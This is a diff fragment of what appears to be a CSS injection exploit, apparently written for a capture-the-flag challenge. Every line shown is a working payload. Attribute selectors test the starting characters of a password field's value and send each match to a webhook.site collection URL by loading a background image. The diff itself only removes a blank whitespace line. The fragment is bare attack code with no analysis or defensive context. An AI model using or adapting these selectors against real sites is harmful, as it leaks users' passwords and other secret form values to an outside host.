@@ -65,4 +65,3 @@ input[name="password"][value^="fl_"]{background-image:url("https://webhook.site/
 input[name="password"][value^="fl{"]{background-image:url("https://webhook.site/5c4a6e7c-0830-4b8e-a6f1-fc43af2bad97?match=fl{")}
 input[name="password"][value^="fl}"]{background-image:url("https://webhook.site/5c4a6e7c-0830-4b8e-a6f1-fc43af2bad97?match=fl}")}
 input[name="password"][value^="fl-"]{background-image:url("https://webhook.site/5c4a6e7c-0830-4b8e-a6f1-fc43af2bad97?match=fl-")}
-                                                                                              
